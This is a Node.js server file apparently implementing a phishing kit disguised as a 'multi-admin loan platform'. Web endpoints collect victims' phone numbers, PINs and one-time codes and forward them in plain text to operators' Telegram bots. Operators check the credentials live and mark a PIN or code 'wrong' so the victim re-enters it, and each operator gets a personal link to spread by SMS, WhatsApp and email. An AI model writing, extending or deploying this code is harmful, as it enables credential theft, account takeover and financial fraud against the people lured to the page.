const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

// ✅ ADD THIS - Database module
const db = require('./database');

const app = express();

// ==========================================
// MULTI-ADMIN SYSTEM WITH DATABASE
// ==========================================

// ✅ CHANGED - Only keep bot instances in memory, data is in DB
const adminBots = new Map(); // adminId => TelegramBot instance

// Super Admin Configuration
const SUPER_ADMIN_BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const SUPER_ADMIN_CHAT_ID = process.env.SUPER_ADMIN_CHAT_ID;

// ✅ FIX: Initialize super admin bot later after proper cleanup
let superAdminBot = null;

// ✅ ADD THIS - Database initialization
let dbReady = false;

(async () => {
    try {
        await db.connectDatabase();
        dbReady = true;
        console.log('✅ Database ready!');
        
        // ✅ FIX: Initialize super admin bot with error handling
        await initializeSuperAdminBot();
        
        // Initialize bots from database
        await initializeBotsFromDatabase();
    } catch (error) {
        console.error('❌ Database initialization failed:', error);
        process.exit(1);
    }
})();

// ✅ NEW: Initialize super admin bot with proper error handling
async function initializeSuperAdminBot() {
    try {
        if (!SUPER_ADMIN_BOT_TOKEN) {
            console.error('❌ SUPER_ADMIN_BOT_TOKEN not set');
            return;
        }
        
        superAdminBot = new TelegramBot(SUPER_ADMIN_BOT_TOKEN, { 
            polling: {
                interval: 300,
                autoStart: true,
                params: {
                    timeout: 10
                }
            }
        });
        
        setupSuperAdminHandlers();
        
        superAdminBot.on('polling_error', (error) => {
            console.error('Super Admin bot polling error:', error.code, error.message);
            if (error.code === 'ETELEGRAM') {
                console.log('⚠️ Telegram polling conflict detected for super admin bot');
            }
        });
        
        console.log('✅ Super Admin bot initialized');
    } catch (error) {
        console.error('❌ Failed to initialize super admin bot:', error);
    }
}

// ✅ ADD THIS - Load admin bots from database
async function initializeBotsFromDatabase() {
    const admins = await db.getAllAdmins();
    console.log(`📋 Loading ${admins.length} admins from database...`);
    
    for (const admin of admins) {
        if (admin.status === 'active') {
            // ✅ FIX: Check if bot already exists before creating
            if (adminBots.has(admin.adminId)) {
                console.log(`⚠️ Bot already exists for: ${admin.name}, skipping...`);
                continue;
            }
            
            const bot = await createAdminBot(admin.adminId, admin.botToken);
            if (bot) {
                console.log(`✅ Bot initialized for: ${admin.name}`);
            }
        }
    }
}

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// ✅ ADD THIS - Middleware to check database ready
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health')) {
        return res.status(503).json({ 
            success: false, 
            message: 'Database not ready yet' 
        });
    }
    next();
});

// ==========================================
// ADMIN MANAGEMENT FUNCTIONS
// ==========================================

// ✅ FIX: Improved bot creation with proper cleanup
async function createAdminBot(adminId, botToken) {
    try {
        // ✅ FIX: Stop existing bot if it exists
        if (adminBots.has(adminId)) {
            console.log(`🔄 Stopping existing bot for admin: ${adminId}`);
            const oldBot = adminBots.get(adminId);
            try {
                await oldBot.stopPolling();
            } catch (e) {
                console.log('Old bot already stopped');
            }
            adminBots.delete(adminId);
        }
        
        // ✅ FIX: Create bot with proper polling configuration
        const bot = new TelegramBot(botToken, { 
            polling: {
                interval: 300,
                autoStart: true,
                params: {
                    timeout: 10
                }
            }
        });
        
        adminBots.set(adminId, bot);
        
        // Setup bot handlers
        setupAdminBotHandlers(adminId, bot);
        
        console.log(`✅ Created bot for admin: ${adminId}`);
        return bot;
    } catch (error) {
        console.error(`❌ Error creating bot for admin ${adminId}:`, error.message);
        return null;
    }
}

// ✅ NEW: Function to safely stop a bot
async function stopAdminBot(adminId) {
    try {
        if (adminBots.has(adminId)) {
            const bot = adminBots.get(adminId);
            await bot.stopPolling();
            adminBots.delete(adminId);
            console.log(`🛑 Stopped bot for admin: ${adminId}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error(`❌ Error stopping bot for admin ${adminId}:`, error.message);
        return false;
    }
}

function setupAdminBotHandlers(adminId, bot) {
    // Bot commands for sub-admins
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
👋 *Welcome ${admin ? admin.name : 'Admin'}!*

This is your dedicated loan application bot.

*Your Admin ID:* \`${adminId}\`
*Your Chat ID:* \`${chatId}\`

*Your Personal Link:*
${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}

*Process:*
1️⃣ Users submit applications through your link
2️⃣ You receive phone + PIN for verification
3️⃣ You approve/reject PIN
4️⃣ User enters OTP
5️⃣ You approve/reject OTP
6️⃣ Loan is approved!

*Commands:*
/start - Show this message
/mylink - Get your personal link
/stats - View your statistics
/pending - List your pending applications
/myinfo - View your admin information
        `, { parse_mode: 'Markdown' });
    });

    // My link command
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
🔗 *YOUR PERSONAL APPLICATION LINK*

Share this link with customers to assign applications to you:

\`${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}\`

📋 All applications from this link will be assigned to: *${admin.name}*

💡 *Tip:* You can share this link via:
• WhatsApp
• SMS
• Email
• Social Media
        `, { parse_mode: 'Markdown' });
    });

    // Stats command for sub-admin
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        
        // ✅ GET FROM DATABASE
        const stats = await db.getAdminStats(adminId);
        
        bot.sendMessage(chatId, `
📊 *YOUR LOAN STATISTICS*

📋 Total Applications: ${stats.total}
⏳ Awaiting PIN Approval: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ Awaiting OTP Approval: ${stats.otpPending}
🎉 Fully Approved Loans: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // Pending command
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        
        // ✅ GET FROM DATABASE
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *YOUR PENDING APPLICATIONS*\n\n`;
        
        if (pinPending.length > 0) {
            message += `📱 *Awaiting PIN Approval (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        
        if (otpPending.length > 0) {
            message += `🔢 *Awaiting OTP Approval (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
            });
        }
        
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // My info command
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        if (admin) {
            bot.sendMessage(chatId, `
ℹ️ *YOUR ADMIN INFORMATION*

👤 *Name:* ${admin.name}
📧 *Email:* ${admin.email}
🆔 *Admin ID:* \`${adminId}\`
💬 *Chat ID:* \`${admin.chatId}\`
📅 *Created:* ${new Date(admin.createdAt).toLocaleString()}
✅ *Status:* ${admin.status}

🔗 *Your Link:*
${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}
            `, { parse_mode: 'Markdown' });
        }
    });

    // Handle callback queries for this admin
    bot.on('callback_query', async (callbackQuery) => {
        await handleAdminCallback(adminId, bot, callbackQuery);
    });

    // ✅ FIX: Enhanced error handling
    bot.on('polling_error', (error) => {
        console.error(`Polling error for admin ${adminId}:`, error.code, error.message);
        
        // ✅ FIX: Handle ETELEGRAM error specifically
        if (error.code === 'ETELEGRAM') {
            console.log(`⚠️ Telegram polling conflict for admin ${adminId}. Another instance might be running.`);
            console.log(`💡 Tip: Make sure only one instance of this bot is running.`);
        }
    });

    // ✅ NEW: Handle webhook errors
    bot.on('webhook_error', (error) => {
        console.error(`Webhook error for admin ${adminId}:`, error);
    });
}

// ✅ NEW: Setup super admin handlers
function setupSuperAdminHandlers() {
    if (!superAdminBot) return;
    
    superAdminBot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        
        const stats = await db.getStats();
        
        superAdminBot.sendMessage(chatId, `
👑 *SUPER ADMIN PANEL*

Welcome to the Super Admin Dashboard!

📊 *SYSTEM STATISTICS*
👥 Total Admins: ${stats.totalAdmins}
📋 Total Applications: ${stats.totalApplications}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
❌ Rejected: ${stats.totalRejected}

*Commands:*
/start - Show this message
/stats - View detailed statistics
/admins - List all admins
/addadmin - Add a new admin
        `, { parse_mode: 'Markdown' });
    });
}

async function handleAdminCallback(adminId, bot, callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    // Check for wrongpin_otp action
    if (data.startsWith('wrongpin_otp_')) {
        const applicationId = data.replace('wrongpin_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'wrongpin_otp'
        });
        
        const updatedMessage = `
❌ *WRONG PIN AT OTP STAGE*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Code: \`${application.otp}\`

⚠️ *Status:* User's PIN was incorrect
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will be redirected to re-enter PIN.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ User will re-enter PIN'
        });
        
        return;
    }
    
    // Check for wrongcode_otp action
    if (data.startsWith('wrongcode_otp_')) {
        const applicationId = data.replace('wrongcode_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'wrongcode'
        });
        
        const updatedMessage = `
❌ *WRONG VERIFICATION CODE*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Code: \`${application.otp}\`

⚠️ *Status:* User entered wrong code
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will be redirected to re-enter code.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ User will re-enter code'
        });
        
        return;
    }
    
    // Check for approve_pin action
    if (data.startsWith('approve_pin_')) {
        const applicationId = data.replace('approve_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            pinStatus: 'rejected'
        });
        
        const updatedMessage = `
❌ *APPLICATION DENIED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`

⚠️ *Status:* REJECTED - Invalid Information
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

This application has been denied.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ Application denied'
        });
        
        return;
    }
    
    // Check for reject_pin action (this actually approves it - confusing naming in original)
    if (data.startsWith('reject_pin_')) {
        const applicationId = data.replace('reject_pin_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            pinStatus: 'approved'
        });
        
        const updatedMessage = `
✅ *PIN APPROVED - AWAITING OTP*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`

✅ *Status:* PIN Approved - User can now enter OTP
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

Waiting for user to enter verification code...
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ PIN approved - waiting for OTP'
        });
        
        return;
    }
    
    // Check for approve_otp action
    if (data.startsWith('approve_otp_')) {
        const applicationId = data.replace('approve_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'approved'
        });
        
        const updatedMessage = `
🎉 *LOAN APPROVED!*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔑 PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`

✅ *Status:* FULLY APPROVED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

💰 Loan application has been successfully approved!
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '🎉 Loan approved!'
        });
        
        return;
    }
}

// ==========================================
// API ENDPOINTS
// ==========================================

// API: Verify PIN
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        
        // Generate unique application ID
        const applicationId = `APP-${Date.now()}`;
        
        // Determine which admin to assign to
        let assignedAdmin;
        
        if (assignmentType === 'specific' && requestAdminId) {
            // Assign to specific admin from URL parameter
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || assignedAdmin.status !== 'active') {
                return res.status(400).json({ 
                    success: false, 
                    message: 'Invalid or inactive admin' 
                });
            }
        } else {
            // Auto-assign to least busy admin
            const activeAdmins = await db.getActiveAdmins();
            
            if (activeAdmins.length === 0) {
                return res.status(503).json({ 
                    success: false, 
                    message: 'No admins available' 
                });
            }
            
            // Get admin with least pending applications
            const adminStats = await Promise.all(
                activeAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );
            
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
        }
        
        const bot = adminBots.get(assignedAdmin.adminId);
        
        if (!bot) {
            return res.status(503).json({ 
                success: false, 
                message: 'Admin bot not available' 
            });
        }
        
        // ✅ SAVE TO DATABASE
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            timestamp: new Date().toISOString()
        });
        
        // Send to admin's bot
        const message = `
📱 *NEW LOAN APPLICATION*

📋 *Application ID:* \`${applicationId}\`
📱 *Phone Number:* ${phoneNumber}
🔑 *PIN:* \`${pin}\`

⏰ *Time:* ${new Date().toLocaleString()}
📊 *Assignment:* ${assignmentType === 'specific' ? 'Direct Link' : 'Auto-assigned'}

---
⚠️ *VERIFY INFORMATION*
Please verify if this phone number and PIN are correct.
        `;
        
        await bot.sendMessage(assignedAdmin.chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { 
                            text: '❌ Invalid Information - Deny Application', 
                            callback_data: `approve_pin_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '✅ All Correct - Allow OTP Entry', 
                            callback_data: `reject_pin_${applicationId}` 
                        }
                    ]
                ]
            }
        });
        
        console.log(`📤 Application sent to admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        
        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
        
    } catch (error) {
        console.error('❌ Error in verify-pin:', error);
        res.status(500).json({ success: false, message: 'Failed to submit' });
    }
});

// API: Check PIN status
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    
    // ✅ GET FROM DATABASE
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.pinStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

// API: Verify OTP
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        
        // ✅ GET FROM DATABASE
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin not available' });
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otp: otp,
            otpStatus: 'pending'
        });
        
        // Send OTP to admin's bot
        const message = `
📲 *CODE VERIFICATION*

📋 *Application ID:* \`${applicationId}\`
📱 *Phone:* ${application.phoneNumber}

🔢 *Verification Code:* \`${otp}\`

⏰ *Time:* ${new Date().toLocaleString()}

---
⚠️ *VERIFY CODE*
Is this verification code correct for this application?
        `;
        
        await bot.sendMessage(admin.chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { 
                            text: '❌ Wrong PIN - User Entered Wrong PIN', 
                            callback_data: `wrongpin_otp_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '❌ Wrong Code - User Entered Wrong Code', 
                            callback_data: `wrongcode_otp_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '✅ All Correct - Approve Loan', 
                            callback_data: `approve_otp_${applicationId}` 
                        }
                    ]
                ]
            }
        });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed to verify OTP' });
    }
});

// API: Check OTP status
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    
    // ✅ GET FROM DATABASE
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.otpStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

// API: Resend OTP
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        
        // ✅ GET FROM DATABASE
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin not available' });
        }
        
        await bot.sendMessage(admin.chatId, `
🔄 *OTP RESEND REQUEST*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}

User requested OTP resend.
        `, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed to resend OTP' });
    }
});

// API: Get active admins list (for frontend)
app.get('/api/admins', async (req, res) => {
    // ✅ GET FROM DATABASE
    const admins = await db.getActiveAdmins();
    
    const adminList = admins.map(admin => ({
        id: admin.adminId,
        name: admin.name,
        email: admin.email,
        status: admin.status
    }));
    
    res.json({ success: true, admins: adminList });
});

// API: Validate admin ID
app.get('/api/validate-admin/:adminId', async (req, res) => {
    const { adminId } = req.params;
    
    // ✅ GET FROM DATABASE
    const admin = await db.getAdmin(adminId);
    
    if (admin && admin.status === 'active') {
        res.json({ 
            success: true, 
            valid: true,
            admin: {
                id: admin.adminId,
                name: admin.name,
                email: admin.email
            }
        });
    } else {
        res.json({ 
            success: true, 
            valid: false,
            message: 'Admin not found or inactive'
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        database: dbReady ? 'connected' : 'not ready',
        activeBots: adminBots.size,
        timestamp: new Date().toISOString()
    });
});

// Serve admin selector page
app.get('/admin-select', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

// ==========================================
// SERVER STARTUP
// ==========================================

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`👑 Super Admin Bot: ${superAdminBot ? 'Active' : 'Pending'}`);
    console.log(`💬 Super Admin Chat: ${SUPER_ADMIN_CHAT_ID || 'NOT SET'}`);
    console.log(`\n✅ Platform ready!\n`);
});

// ✅ IMPROVED: Graceful shutdown with proper cleanup
process.on('SIGTERM', async () => {
    console.log('SIGTERM received, shutting down gracefully...');
    await shutdownGracefully();
});

process.on('SIGINT', async () => {
    console.log('SIGINT received, shutting down gracefully...');
    await shutdownGracefully();
});

async function shutdownGracefully() {
    console.log('🛑 Stopping all bots...');
    
    // Stop super admin bot
    if (superAdminBot) {
        try {
            await superAdminBot.stopPolling();
            console.log('✅ Super admin bot stopped');
        } catch (e) {
            console.log('Super admin bot already stopped');
        }
    }
    
    // Stop all admin bots
    for (const [adminId, bot] of adminBots.entries()) {
        try {
            await bot.stopPolling();
            console.log(`✅ Bot stopped for admin: ${adminId}`);
        } catch (e) {
            console.log(`Bot already stopped for admin: ${adminId}`);
        }
    }
    
    adminBots.clear();
    
    // Close database
    await db.closeDatabase();
    
    console.log('✅ Graceful shutdown complete');
    process.exit(0);
}

// Error handling
process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
    shutdownGracefully();
});